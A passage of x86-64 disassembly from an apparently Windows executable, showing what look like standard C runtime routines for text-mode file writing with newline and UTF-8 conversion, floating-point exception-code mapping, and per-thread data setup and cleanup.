   1400065b3:	0f 84 e2 fe ff ff    	je     0x14000649b
   1400065b9:	03 5c 24 50          	add    0x50(%rsp),%ebx
   1400065bd:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   1400065c4:	48 2b f8             	sub    %rax,%rdi
   1400065c7:	48 63 44 24 50       	movslq 0x50(%rsp),%rax
   1400065cc:	48 3b c7             	cmp    %rdi,%rax
   1400065cf:	0f 8c dd fe ff ff    	jl     0x1400064b2
   1400065d5:	41 8b c4             	mov    %r12d,%eax
   1400065d8:	ba 0d 00 00 00       	mov    $0xd,%edx
   1400065dd:	4c 8d 0d 2c 49 01 00 	lea    0x1492c(%rip),%r9        # 0x14001af10
   1400065e4:	41 2b c6             	sub    %r14d,%eax
   1400065e7:	41 3b c7             	cmp    %r15d,%eax
   1400065ea:	0f 82 40 ff ff ff    	jb     0x140006530
   1400065f0:	e9 bd fe ff ff       	jmp    0x1400064b2
   1400065f5:	41 80 fc 02          	cmp    $0x2,%r12b
   1400065f9:	4d 8b e6             	mov    %r14,%r12
   1400065fc:	0f 85 e0 00 00 00    	jne    0x1400066e2
   140006602:	45 85 ff             	test   %r15d,%r15d
   140006605:	0f 84 48 02 00 00    	je     0x140006853
   14000660b:	ba 0d 00 00 00       	mov    $0xd,%edx
   140006610:	eb 02                	jmp    0x140006614
   140006612:	33 c0                	xor    %eax,%eax
   140006614:	44 8b 6c 24 40       	mov    0x40(%rsp),%r13d
   140006619:	48 8d bd 30 06 00 00 	lea    0x630(%rbp),%rdi
   140006620:	48 8b c8             	mov    %rax,%rcx
   140006623:	41 8b c4             	mov    %r12d,%eax
   140006626:	41 2b c6             	sub    %r14d,%eax
   140006629:	41 3b c7             	cmp    %r15d,%eax
   14000662c:	73 32                	jae    0x140006660
   14000662e:	41 0f b7 04 24       	movzwl (%r12),%eax
   140006633:	49 83 c4 02          	add    $0x2,%r12
   140006637:	66 83 f8 0a          	cmp    $0xa,%ax
   14000663b:	75 0f                	jne    0x14000664c
   14000663d:	66 89 17             	mov    %dx,(%rdi)
   140006640:	41 83 c5 02          	add    $0x2,%r13d
   140006644:	48 83 c7 02          	add    $0x2,%rdi
   140006648:	48 83 c1 02          	add    $0x2,%rcx
   14000664c:	48 83 c1 02          	add    $0x2,%rcx
   140006650:	66 89 07             	mov    %ax,(%rdi)
   140006653:	48 83 c7 02          	add    $0x2,%rdi
   140006657:	48 81 f9 fe 13 00 00 	cmp    $0x13fe,%rcx
   14000665e:	72 c3                	jb     0x140006623
   140006660:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   140006667:	44 8b c7             	mov    %edi,%r8d
   14000666a:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   14000666f:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   140006674:	44 2b c0             	sub    %eax,%r8d
   140006677:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000667c:	49 8b 0c c1          	mov    (%r9,%rax,8),%rcx
   140006680:	33 c0                	xor    %eax,%eax
   140006682:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140006687:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   14000668c:	48 8d 95 30 06 00 00 	lea    0x630(%rbp),%rdx
   140006693:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006698:	ff 15 da aa 00 00    	call   *0xaada(%rip)        # 0x140011178
   14000669e:	85 c0                	test   %eax,%eax
   1400066a0:	0f 84 f5 fd ff ff    	je     0x14000649b
   1400066a6:	03 5c 24 50          	add    0x50(%rsp),%ebx
   1400066aa:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   1400066b1:	48 2b f8             	sub    %rax,%rdi
   1400066b4:	48 63 44 24 50       	movslq 0x50(%rsp),%rax
   1400066b9:	48 3b c7             	cmp    %rdi,%rax
   1400066bc:	0f 8c f0 fd ff ff    	jl     0x1400064b2
   1400066c2:	41 8b c4             	mov    %r12d,%eax
   1400066c5:	ba 0d 00 00 00       	mov    $0xd,%edx
   1400066ca:	4c 8d 0d 3f 48 01 00 	lea    0x1483f(%rip),%r9        # 0x14001af10
   1400066d1:	41 2b c6             	sub    %r14d,%eax
   1400066d4:	41 3b c7             	cmp    %r15d,%eax
   1400066d7:	0f 82 35 ff ff ff    	jb     0x140006612
   1400066dd:	e9 d0 fd ff ff       	jmp    0x1400064b2
   1400066e2:	45 85 ff             	test   %r15d,%r15d
   1400066e5:	0f 84 68 01 00 00    	je     0x140006853
   1400066eb:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   1400066f1:	eb 02                	jmp    0x1400066f5
   1400066f3:	33 c0                	xor    %eax,%eax
   1400066f5:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1400066f9:	48 8b d0             	mov    %rax,%rdx
   1400066fc:	41 8b c4             	mov    %r12d,%eax
   1400066ff:	41 2b c6             	sub    %r14d,%eax
   140006702:	41 3b c7             	cmp    %r15d,%eax
   140006705:	73 2f                	jae    0x140006736
   140006707:	41 0f b7 04 24       	movzwl (%r12),%eax
   14000670c:	49 83 c4 02          	add    $0x2,%r12
   140006710:	66 83 f8 0a          	cmp    $0xa,%ax
   140006714:	75 0c                	jne    0x140006722
   140006716:	66 44 89 01          	mov    %r8w,(%rcx)
   14000671a:	48 83 c1 02          	add    $0x2,%rcx
   14000671e:	48 83 c2 02          	add    $0x2,%rdx
   140006722:	48 83 c2 02          	add    $0x2,%rdx
   140006726:	66 89 01             	mov    %ax,(%rcx)
   140006729:	48 83 c1 02          	add    $0x2,%rcx
   14000672d:	48 81 fa a8 06 00 00 	cmp    $0x6a8,%rdx
   140006734:	72 c6                	jb     0x1400066fc
   140006736:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   14000673a:	33 ff                	xor    %edi,%edi
   14000673c:	4c 8d 45 80          	lea    -0x80(%rbp),%r8
   140006740:	2b c8                	sub    %eax,%ecx
   140006742:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140006747:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000674c:	8b c1                	mov    %ecx,%eax
   14000674e:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   140006753:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   14000675a:	00 
   14000675b:	99                   	cltd
   14000675c:	2b c2                	sub    %edx,%eax
   14000675e:	33 d2                	xor    %edx,%edx
   140006760:	d1 f8                	sar    $1,%eax
   140006762:	44 8b c8             	mov    %eax,%r9d
   140006765:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   14000676c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006771:	ff 15 09 aa 00 00    	call   *0xaa09(%rip)        # 0x140011180
   140006777:	44 8b e8             	mov    %eax,%r13d
   14000677a:	85 c0                	test   %eax,%eax
   14000677c:	0f 84 23 fd ff ff    	je     0x1400064a5
   140006782:	48 63 c7             	movslq %edi,%rax
   140006785:	45 8b c5             	mov    %r13d,%r8d
   140006788:	48 8d 95 30 06 00 00 	lea    0x630(%rbp),%rdx
   14000678f:	48 03 d0             	add    %rax,%rdx
   140006792:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140006797:	48 8d 0d 72 47 01 00 	lea    0x14772(%rip),%rcx        # 0x14001af10
   14000679e:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   1400067a2:	33 c0                	xor    %eax,%eax
   1400067a4:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1400067a9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400067ae:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1400067b3:	44 2b c7             	sub    %edi,%r8d
   1400067b6:	48 8b 0c 08          	mov    (%rax,%rcx,1),%rcx
   1400067ba:	ff 15 b8 a9 00 00    	call   *0xa9b8(%rip)        # 0x140011178
   1400067c0:	85 c0                	test   %eax,%eax
   1400067c2:	74 0b                	je     0x1400067cf
   1400067c4:	03 7c 24 50          	add    0x50(%rsp),%edi
   1400067c8:	44 3b ef             	cmp    %edi,%r13d
   1400067cb:	7f b5                	jg     0x140006782
   1400067cd:	eb 08                	jmp    0x1400067d7
   1400067cf:	ff 15 bb a8 00 00    	call   *0xa8bb(%rip)        # 0x140011090
   1400067d5:	8b f0                	mov    %eax,%esi
   1400067d7:	44 3b ef             	cmp    %edi,%r13d
   1400067da:	0f 8f cd fc ff ff    	jg     0x1400064ad
   1400067e0:	41 8b dc             	mov    %r12d,%ebx
   1400067e3:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   1400067e9:	41 2b de             	sub    %r14d,%ebx
   1400067ec:	41 3b df             	cmp    %r15d,%ebx
   1400067ef:	0f 82 fe fe ff ff    	jb     0x1400066f3
   1400067f5:	e9 b3 fc ff ff       	jmp    0x1400064ad
   1400067fa:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   1400067ff:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140006804:	45 8b c7             	mov    %r15d,%r8d
   140006807:	49 8b d6             	mov    %r14,%rdx
   14000680a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000680f:	ff 15 63 a9 00 00    	call   *0xa963(%rip)        # 0x140011178
   140006815:	85 c0                	test   %eax,%eax
   140006817:	74 0b                	je     0x140006824
   140006819:	8b 5c 24 50          	mov    0x50(%rsp),%ebx
   14000681d:	8b c6                	mov    %esi,%eax
   14000681f:	e9 97 fc ff ff       	jmp    0x1400064bb
   140006824:	ff 15 66 a8 00 00    	call   *0xa866(%rip)        # 0x140011090
   14000682a:	8b f0                	mov    %eax,%esi
   14000682c:	8b c3                	mov    %ebx,%eax
   14000682e:	e9 88 fc ff ff       	jmp    0x1400064bb
   140006833:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   140006838:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000683d:	e9 79 fc ff ff       	jmp    0x1400064bb
   140006842:	8b ce                	mov    %esi,%ecx
   140006844:	e8 df dc ff ff       	call   0x140004528
   140006849:	e9 ec f8 ff ff       	jmp    0x14000613a
   14000684e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140006853:	48 8d 05 b6 46 01 00 	lea    0x146b6(%rip),%rax        # 0x14001af10
   14000685a:	48 8b 04 f8          	mov    (%rax,%rdi,8),%rax
   14000685e:	41 f6 44 05 08 40    	testb  $0x40,0x8(%r13,%rax,1)
   140006864:	74 0a                	je     0x140006870
   140006866:	41 80 3e 1a          	cmpb   $0x1a,(%r14)
   14000686a:	0f 84 a6 f8 ff ff    	je     0x140006116
   140006870:	e8 03 dd ff ff       	call   0x140004578
   140006875:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   14000687b:	e8 88 dc ff ff       	call   0x140004508
   140006880:	89 18                	mov    %ebx,(%rax)
   140006882:	e9 b3 f8 ff ff       	jmp    0x14000613a
   140006887:	2b d8                	sub    %eax,%ebx
   140006889:	8b c3                	mov    %ebx,%eax
   14000688b:	48 8b 8d 30 1a 00 00 	mov    0x1a30(%rbp),%rcx
   140006892:	48 33 cc             	xor    %rsp,%rcx
   140006895:	e8 a6 c9 ff ff       	call   0x140003240
   14000689a:	48 8b 9c 24 98 1b 00 	mov    0x1b98(%rsp),%rbx
   1400068a1:	00 
   1400068a2:	48 81 c4 40 1b 00 00 	add    $0x1b40,%rsp
   1400068a9:	41 5f                	pop    %r15
   1400068ab:	41 5e                	pop    %r14
   1400068ad:	41 5d                	pop    %r13
   1400068af:	41 5c                	pop    %r12
   1400068b1:	5f                   	pop    %rdi
   1400068b2:	5e                   	pop    %rsi
   1400068b3:	5d                   	pop    %rbp
   1400068b4:	c3                   	ret
   1400068b5:	cc                   	int3
   1400068b6:	cc                   	int3
   1400068b7:	cc                   	int3
   1400068b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400068bd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400068c2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400068c7:	57                   	push   %rdi
   1400068c8:	48 83 ec 20          	sub    $0x20,%rsp
   1400068cc:	48 8b f2             	mov    %rdx,%rsi
   1400068cf:	8b f9                	mov    %ecx,%edi
   1400068d1:	e8 06 03 00 00       	call   0x140006bdc
   1400068d6:	45 33 c9             	xor    %r9d,%r9d
   1400068d9:	48 8b d8             	mov    %rax,%rbx
   1400068dc:	48 85 c0             	test   %rax,%rax
   1400068df:	0f 84 88 01 00 00    	je     0x140006a6d
   1400068e5:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   1400068ec:	48 8b ca             	mov    %rdx,%rcx
   1400068ef:	39 39                	cmp    %edi,(%rcx)
   1400068f1:	74 10                	je     0x140006903
   1400068f3:	48 8d 82 c0 00 00 00 	lea    0xc0(%rdx),%rax
   1400068fa:	48 83 c1 10          	add    $0x10,%rcx
   1400068fe:	48 3b c8             	cmp    %rax,%rcx
   140006901:	72 ec                	jb     0x1400068ef
   140006903:	48 8d 82 c0 00 00 00 	lea    0xc0(%rdx),%rax
   14000690a:	48 3b c8             	cmp    %rax,%rcx
   14000690d:	73 04                	jae    0x140006913
   14000690f:	39 39                	cmp    %edi,(%rcx)
   140006911:	74 03                	je     0x140006916
   140006913:	49 8b c9             	mov    %r9,%rcx
   140006916:	48 85 c9             	test   %rcx,%rcx
   140006919:	0f 84 4e 01 00 00    	je     0x140006a6d
   14000691f:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   140006923:	4d 85 c0             	test   %r8,%r8
   140006926:	0f 84 41 01 00 00    	je     0x140006a6d
   14000692c:	49 83 f8 05          	cmp    $0x5,%r8
   140006930:	75 0d                	jne    0x14000693f
   140006932:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   140006936:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   14000693a:	e9 30 01 00 00       	jmp    0x140006a6f
   14000693f:	49 83 f8 01          	cmp    $0x1,%r8
   140006943:	75 08                	jne    0x14000694d
   140006945:	83 c8 ff             	or     $0xffffffff,%eax
   140006948:	e9 22 01 00 00       	jmp    0x140006a6f
   14000694d:	48 8b ab a8 00 00 00 	mov    0xa8(%rbx),%rbp
   140006954:	48 89 b3 a8 00 00 00 	mov    %rsi,0xa8(%rbx)
   14000695b:	83 79 04 08          	cmpl   $0x8,0x4(%rcx)
   14000695f:	0f 85 f2 00 00 00    	jne    0x140006a57
   140006965:	ba 30 00 00 00       	mov    $0x30,%edx
   14000696a:	48 8b 83 a0 00 00 00 	mov    0xa0(%rbx),%rax
   140006971:	48 83 c2 10          	add    $0x10,%rdx
   140006975:	4c 89 4c 02 f8       	mov    %r9,-0x8(%rdx,%rax,1)
   14000697a:	48 81 fa c0 00 00 00 	cmp    $0xc0,%rdx
   140006981:	7c e7                	jl     0x14000696a
   140006983:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%rcx)
   140006989:	8b bb b0 00 00 00    	mov    0xb0(%rbx),%edi
   14000698f:	75 0f                	jne    0x1400069a0
   140006991:	c7 83 b0 00 00 00 83 	movl   $0x83,0xb0(%rbx)
   140006998:	00 00 00 
   14000699b:	e9 a1 00 00 00       	jmp    0x140006a41
   1400069a0:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%rcx)
   1400069a6:	75 0f                	jne    0x1400069b7
   1400069a8:	c7 83 b0 00 00 00 81 	movl   $0x81,0xb0(%rbx)
   1400069af:	00 00 00 
   1400069b2:	e9 8a 00 00 00       	jmp    0x140006a41
   1400069b7:	81 39 91 00 00 c0    	cmpl   $0xc0000091,(%rcx)
   1400069bd:	75 0c                	jne    0x1400069cb
   1400069bf:	c7 83 b0 00 00 00 84 	movl   $0x84,0xb0(%rbx)
   1400069c6:	00 00 00 
   1400069c9:	eb 76                	jmp    0x140006a41
   1400069cb:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%rcx)
   1400069d1:	75 0c                	jne    0x1400069df
   1400069d3:	c7 83 b0 00 00 00 85 	movl   $0x85,0xb0(%rbx)
   1400069da:	00 00 00 
   1400069dd:	eb 62                	jmp    0x140006a41
   1400069df:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%rcx)
   1400069e5:	75 0c                	jne    0x1400069f3
   1400069e7:	c7 83 b0 00 00 00 82 	movl   $0x82,0xb0(%rbx)
   1400069ee:	00 00 00 
   1400069f1:	eb 4e                	jmp    0x140006a41
   1400069f3:	81 39 8f 00 00 c0    	cmpl   $0xc000008f,(%rcx)
   1400069f9:	75 0c                	jne    0x140006a07
   1400069fb:	c7 83 b0 00 00 00 86 	movl   $0x86,0xb0(%rbx)
   140006a02:	00 00 00 
   140006a05:	eb 3a                	jmp    0x140006a41
   140006a07:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%rcx)
   140006a0d:	75 0c                	jne    0x140006a1b
   140006a0f:	c7 83 b0 00 00 00 8a 	movl   $0x8a,0xb0(%rbx)
   140006a16:	00 00 00 
   140006a19:	eb 26                	jmp    0x140006a41
   140006a1b:	81 39 b5 02 00 c0    	cmpl   $0xc00002b5,(%rcx)
   140006a21:	75 0c                	jne    0x140006a2f
   140006a23:	c7 83 b0 00 00 00 8d 	movl   $0x8d,0xb0(%rbx)
   140006a2a:	00 00 00 
   140006a2d:	eb 12                	jmp    0x140006a41
   140006a2f:	81 39 b4 02 00 c0    	cmpl   $0xc00002b4,(%rcx)
   140006a35:	75 0a                	jne    0x140006a41
   140006a37:	c7 83 b0 00 00 00 8e 	movl   $0x8e,0xb0(%rbx)
   140006a3e:	00 00 00 
   140006a41:	8b 93 b0 00 00 00    	mov    0xb0(%rbx),%edx
   140006a47:	b9 08 00 00 00       	mov    $0x8,%ecx
   140006a4c:	41 ff d0             	call   *%r8
   140006a4f:	89 bb b0 00 00 00    	mov    %edi,0xb0(%rbx)
   140006a55:	eb 0a                	jmp    0x140006a61
   140006a57:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   140006a5b:	8b 49 04             	mov    0x4(%rcx),%ecx
   140006a5e:	41 ff d0             	call   *%r8
   140006a61:	48 89 ab a8 00 00 00 	mov    %rbp,0xa8(%rbx)
   140006a68:	e9 d8 fe ff ff       	jmp    0x140006945
   140006a6d:	33 c0                	xor    %eax,%eax
   140006a6f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006a74:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006a79:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006a7e:	48 83 c4 20          	add    $0x20,%rsp
   140006a82:	5f                   	pop    %rdi
   140006a83:	c3                   	ret
   140006a84:	48 85 c9             	test   %rcx,%rcx
   140006a87:	0f 84 29 01 00 00    	je     0x140006bb6
   140006a8d:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006a92:	57                   	push   %rdi
   140006a93:	48 83 ec 20          	sub    $0x20,%rsp
   140006a97:	48 8b d9             	mov    %rcx,%rbx
   140006a9a:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   140006a9e:	48 85 c9             	test   %rcx,%rcx
   140006aa1:	74 05                	je     0x140006aa8
   140006aa3:	e8 ec cc ff ff       	call   0x140003794
   140006aa8:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140006aac:	48 85 c9             	test   %rcx,%rcx
   140006aaf:	74 05                	je     0x140006ab6
   140006ab1:	e8 de cc ff ff       	call   0x140003794
   140006ab6:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140006aba:	48 85 c9             	test   %rcx,%rcx
   140006abd:	74 05                	je     0x140006ac4
   140006abf:	e8 d0 cc ff ff       	call   0x140003794
   140006ac4:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140006ac8:	48 85 c9             	test   %rcx,%rcx
   140006acb:	74 05                	je     0x140006ad2
   140006acd:	e8 c2 cc ff ff       	call   0x140003794
   140006ad2:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140006ad6:	48 85 c9             	test   %rcx,%rcx
   140006ad9:	74 05                	je     0x140006ae0
   140006adb:	e8 b4 cc ff ff       	call   0x140003794
   140006ae0:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140006ae4:	48 85 c9             	test   %rcx,%rcx
   140006ae7:	74 05                	je     0x140006aee
   140006ae9:	e8 a6 cc ff ff       	call   0x140003794
   140006aee:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140006af5:	48 85 c9             	test   %rcx,%rcx
   140006af8:	74 05                	je     0x140006aff
   140006afa:	e8 95 cc ff ff       	call   0x140003794
   140006aff:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   140006b06:	48 8d 05 03 af 00 00 	lea    0xaf03(%rip),%rax        # 0x140011a10
   140006b0d:	48 3b c8             	cmp    %rax,%rcx
   140006b10:	74 05                	je     0x140006b17
   140006b12:	e8 7d cc ff ff       	call   0x140003794
   140006b17:	bf 0d 00 00 00       	mov    $0xd,%edi
   140006b1c:	8b cf                	mov    %edi,%ecx
   140006b1e:	e8 8d 13 00 00       	call   0x140007eb0
   140006b23:	90                   	nop
   140006b24:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   140006b2b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140006b30:	48 85 c9             	test   %rcx,%rcx
   140006b33:	74 1c                	je     0x140006b51
   140006b35:	f0 ff 09             	lock decl (%rcx)
   140006b38:	75 17                	jne    0x140006b51
   140006b3a:	48 8d 05 cf 2e 01 00 	lea    0x12ecf(%rip),%rax        # 0x140019a10
   140006b41:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006b46:	48 3b c8             	cmp    %rax,%rcx
   140006b49:	74 06                	je     0x140006b51
   140006b4b:	e8 44 cc ff ff       	call   0x140003794
   140006b50:	90                   	nop
   140006b51:	8b cf                	mov    %edi,%ecx
   140006b53:	e8 48 15 00 00       	call   0x1400080a0
   140006b58:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140006b5d:	e8 4e 13 00 00       	call   0x140007eb0
   140006b62:	90                   	nop
   140006b63:	48 8b bb c0 00 00 00 	mov    0xc0(%rbx),%rdi
   140006b6a:	48 85 ff             	test   %rdi,%rdi
   140006b6d:	74 2b                	je     0x140006b9a
   140006b6f:	48 8b cf             	mov    %rdi,%rcx
   140006b72:	e8 15 24 00 00       	call   0x140008f8c
   140006b77:	48 3b 3d 82 34 01 00 	cmp    0x13482(%rip),%rdi        # 0x14001a000
   140006b7e:	74 1a                	je     0x140006b9a
   140006b80:	48 8d 05 89 34 01 00 	lea    0x13489(%rip),%rax        # 0x14001a010
   140006b87:	48 3b f8             	cmp    %rax,%rdi
   140006b8a:	74 0e                	je     0x140006b9a
   140006b8c:	83 3f 00             	cmpl   $0x0,(%rdi)
   140006b8f:	75 09                	jne    0x140006b9a
   140006b91:	48 8b cf             	mov    %rdi,%rcx
   140006b94:	e8 5b 22 00 00       	call   0x140008df4
   140006b99:	90                   	nop
   140006b9a:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140006b9f:	e8 fc 14 00 00       	call   0x1400080a0
   140006ba4:	48 8b cb             	mov    %rbx,%rcx
   140006ba7:	e8 e8 cb ff ff       	call   0x140003794
   140006bac:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006bb1:	48 83 c4 20          	add    $0x20,%rsp
   140006bb5:	5f                   	pop    %rdi
   140006bb6:	c3                   	ret
   140006bb7:	cc                   	int3
   140006bb8:	40 53                	rex push %rbx
   140006bba:	48 83 ec 20          	sub    $0x20,%rsp
   140006bbe:	e8 19 00 00 00       	call   0x140006bdc
   140006bc3:	48 8b d8             	mov    %rax,%rbx
   140006bc6:	48 85 c0             	test   %rax,%rax
   140006bc9:	75 08                	jne    0x140006bd3
   140006bcb:	8d 48 10             	lea    0x10(%rax),%ecx
   140006bce:	e8 51 03 00 00       	call   0x140006f24
   140006bd3:	48 8b c3             	mov    %rbx,%rax
   140006bd6:	48 83 c4 20          	add    $0x20,%rsp
   140006bda:	5b                   	pop    %rbx
   140006bdb:	c3                   	ret
   140006bdc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006be1:	57                   	push   %rdi
   140006be2:	48 83 ec 20          	sub    $0x20,%rsp
   140006be6:	ff 15 a4 a4 00 00    	call   *0xa4a4(%rip)        # 0x140011090
   140006bec:	8b 0d c6 29 01 00    	mov    0x129c6(%rip),%ecx        # 0x1400195b8
   140006bf2:	8b f8                	mov    %eax,%edi
   140006bf4:	e8 ff cc ff ff       	call   0x1400038f8
   140006bf9:	48 8b d8             	mov    %rax,%rbx
   140006bfc:	48 85 c0             	test   %rax,%rax
   140006bff:	75 47                	jne    0x140006c48
   140006c01:	8d 48 01             	lea    0x1(%rax),%ecx
   140006c04:	ba 78 04 00 00       	mov    $0x478,%edx
   140006c09:	e8 a6 06 00 00       	call   0x1400072b4
   140006c0e:	48 8b d8             	mov    %rax,%rbx
   140006c11:	48 85 c0             	test   %rax,%rax
   140006c14:	74 32                	je     0x140006c48
   140006c16:	8b 0d 9c 29 01 00    	mov    0x1299c(%rip),%ecx        # 0x1400195b8
   140006c1c:	48 8b d0             	mov    %rax,%rdx
   140006c1f:	e8 f0 cc ff ff       	call   0x140003914
   140006c24:	48 8b cb             	mov    %rbx,%rcx
   140006c27:	85 c0                	test   %eax,%eax
   140006c29:	74 16                	je     0x140006c41
   140006c2b:	33 d2                	xor    %edx,%edx
   140006c2d:	e8 2e 00 00 00       	call   0x140006c60
   140006c32:	ff 15 60 a4 00 00    	call   *0xa460(%rip)        # 0x140011098
   140006c38:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   140006c3d:	89 03                	mov    %eax,(%rbx)
   140006c3f:	eb 07                	jmp    0x140006c48
   140006c41:	e8 4e cb ff ff       	call   0x140003794
   140006c46:	33 db                	xor    %ebx,%ebx
   140006c48:	8b cf                	mov    %edi,%ecx
   140006c4a:	ff 15 a8 a4 00 00    	call   *0xa4a8(%rip)        # 0x1400110f8
   140006c50:	48 8b c3             	mov    %rbx,%rax
   140006c53:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006c58:	48 83 c4 20          	add    $0x20,%rsp
   140006c5c:	5f                   	pop    %rdi
   140006c5d:	c3                   	ret
   140006c5e:	cc                   	int3
   140006c5f:	cc                   	int3
   140006c60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006c65:	57                   	push   %rdi
   140006c66:	48 83 ec 20          	sub    $0x20,%rsp
   140006c6a:	48 8b fa             	mov    %rdx,%rdi
   140006c6d:	48 8b d9             	mov    %rcx,%rbx
   140006c70:	48 8d 05 99 ad 00 00 	lea    0xad99(%rip),%rax        # 0x140011a10
   140006c77:	48 89 81 a0 00 00 00 	mov    %rax,0xa0(%rcx)
   140006c7e:	83 61 10 00          	andl   $0x0,0x10(%rcx)
   140006c82:	c7 41 1c 01 00 00 00 	movl   $0x1,0x1c(%rcx)
   140006c89:	c7 81 c8 00 00 00 01 	movl   $0x1,0xc8(%rcx)
   140006c90:	00 00 00 
   140006c93:	b8 43 00 00 00       	mov    $0x43,%eax
   140006c98:	66 89 81 64 01 00 00 	mov    %ax,0x164(%rcx)
   140006c9f:	66 89 81 6a 02 00 00 	mov    %ax,0x26a(%rcx)
   140006ca6:	48 8d 05 63 2d 01 00 	lea    0x12d63(%rip),%rax        # 0x140019a10
   140006cad:	48 89 81 b8 00 00 00 	mov    %rax,0xb8(%rcx)
   140006cb4:	48 83 a1 70 04 00 00 	andq   $0x0,0x470(%rcx)
   140006cbb:	00 
   140006cbc:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140006cc1:	e8 ea 11 00 00       	call   0x140007eb0
   140006cc6:	90                   	nop
   140006cc7:	48 8b 83 b8 00 00 00 	mov    0xb8(%rbx),%rax
   140006cce:	f0 ff 00             	lock incl (%rax)
   140006cd1:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140006cd6:	e8 c5 13 00 00       	call   0x1400080a0
   140006cdb:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140006ce0:	e8 cb 11 00 00       	call   0x140007eb0
   140006ce5:	90                   	nop
   140006ce6:	48 89 bb c0 00 00 00 	mov    %rdi,0xc0(%rbx)
   140006ced:	48 85 ff             	test   %rdi,%rdi
   140006cf0:	75 0e                	jne    0x140006d00
   140006cf2:	48 8b 05 07 33 01 00 	mov    0x13307(%rip),%rax        # 0x14001a000
   140006cf9:	48 89 83 c0 00 00 00 	mov    %rax,0xc0(%rbx)
   140006d00:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   140006d07:	e8 5c 20 00 00       	call   0x140008d68
   140006d0c:	90                   	nop
   140006d0d:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140006d12:	e8 89 13 00 00       	call   0x1400080a0
   140006d17:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006d1c:	48 83 c4 20          	add    $0x20,%rsp
   140006d20:	5f                   	pop    %rdi
   140006d21:	c3                   	ret
   140006d22:	cc                   	int3
   140006d23:	cc                   	int3
   140006d24:	40 53                	rex push %rbx
   140006d26:	48 83 ec 20          	sub    $0x20,%rsp
   140006d2a:	e8 e1 02 00 00       	call   0x140007010
   140006d2f:	e8 08 13 00 00       	call   0x14000803c
   140006d34:	85 c0                	test   %eax,%eax
   140006d36:	74 5e                	je     0x140006d96
   140006d38:	48 8d 0d 45 fd ff ff 	lea    -0x2bb(%rip),%rcx        # 0x140006a84
   140006d3f:	e8 7c cb ff ff       	call   0x1400038c0
   140006d44:	89 05 6e 28 01 00    	mov    %eax,0x1286e(%rip)        # 0x1400195b8
   140006d4a:	83 f8 ff             	cmp    $0xffffffff,%eax
